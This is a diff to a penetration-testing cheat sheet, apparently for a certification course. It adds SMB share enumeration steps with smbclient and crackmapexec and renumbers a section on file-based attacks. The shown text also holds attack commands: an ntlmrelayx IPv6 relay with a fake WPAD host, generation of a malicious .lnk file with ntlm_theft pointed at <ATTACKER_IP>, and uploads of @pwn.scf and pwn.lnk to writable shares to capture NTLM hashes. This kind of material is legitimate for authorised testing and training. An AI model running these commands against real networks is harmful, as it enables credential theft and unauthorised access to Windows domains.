@@ -29,8 +29,11 @@
   - `3.3` **IPv6 mitm6 Attack**
     - `3.3.1` mitm6
     - `3.3.2` impacket-ntlmrelayx (IPv6 relay)
-  - `3.4` **SMB Share File-Based Attacks**
-    - `3.4.1` Upload .scf / .lnk files
+  - `3.4` **SMB Share Enumeration**
+    - `3.4.1` smbclient share listing
+    - `3.4.2` crackmapexec share enumeration
+  - `3.5` **SMB Share File-Based Attacks**
+    - `3.5.1` Upload .scf / .lnk files
 - `4` **Lateral Movement & Shell Access**
   - `4.1` **Impacket**
     - `4.1.1` impacket-psexec
@@ -481,9 +484,73 @@ sudo impacket-ntlmrelayx -6 -t ldap://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR
 
 </details>
 
-### 3.4 SMB Share File-Based Attacks
+### 3.4 SMB Share Enumeration
 
-#### 3.4.1 Upload .scf / .lnk files <sup>· PJPT</sup>
+#### 3.4.1 smbclient share listing <sup>· PJPT</sup>
+
+**Anonymous listing (null session):**
+
+```bash
+smbclient -L \\\\<TARGET_IP>
+```
+
+**Authenticated listing:**
+
+```bash
+smbclient -L \\\\<TARGET_IP> -U <USERNAME> -W <DOMAIN>
+```
+
+**Connect and interact with a known share:**
+
+```bash
+smbclient //<TARGET_IP>/"Share Name" -U <USERNAME> -W <DOMAIN> -m SMB3
+smb: \> dir
+smb: \> put <FILE>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Lists available SMB shares on a target, anonymously or with domain credentials.
+- Some servers allow anonymous null-session enumeration; most require authentication.
+- Once connected to a specific share, use `dir` to list contents and `put` to upload files.
+
+**Parameters**
+
+- `-L` — Lists shares available on the target.
+- `-U <USERNAME>` — Username for authentication.
+- `-W <DOMAIN>` — Domain or workgroup name.
+- `-m SMB3` — Force SMB3 protocol version.
+
+</details>
+
+#### 3.4.2 crackmapexec share enumeration <sup>· PJPT</sup>
+
+```bash
+crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --shares
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Enumerates all accessible SMB shares across one or more targets.
+- Reports read/write permissions for each share on every machine.
+- Useful for identifying writable shares where .scf/.lnk files can be dropped.
+
+**Parameters**
+
+- `<IP/MASK>` — Target IP or CIDR range.
+- `--shares` — Enumerates shares and access permissions.
+
+</details>
+
+### 3.5 SMB Share File-Based Attacks
+
+#### 3.5.1 Upload .scf / .lnk files <sup>· PJPT</sup>
 
 **Create a malicious .scf file:**
 
@@ -503,10 +570,9 @@ cd ntlm_theft
 python3 ntlm_theft.py -g lnk -s <ATTACKER_IP> -f pwn
 ```
 
-**Upload to a writable SMB share:**
+**Upload to a writable SMB share** (see [3.4.1](#341-smbclient-share-listing) for connection):
 
 ```bash
-smbclient //<DC_IP>/"Share Name" -U <USERNAME> -W <DOMAIN> -m SMB3
 smb: \> put @pwn.scf
 smb: \> put pwn.lnk
 ```
